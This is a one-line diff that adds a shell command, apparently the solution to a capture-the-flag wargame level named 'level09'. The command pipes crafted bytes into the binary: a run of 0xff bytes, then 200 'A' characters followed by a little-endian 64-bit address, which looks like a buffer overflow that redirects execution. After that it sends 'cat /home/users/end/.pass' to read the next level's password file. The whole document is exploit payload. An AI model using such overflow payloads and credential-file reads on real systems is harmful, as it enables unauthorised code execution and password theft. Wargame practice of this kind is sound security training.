@@ -1,0 +1,1 @@
+(python -c 'print("\xff" * 41)'; python -c 'print("A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo "cat /home/users/end/.pass" ) | ./level09
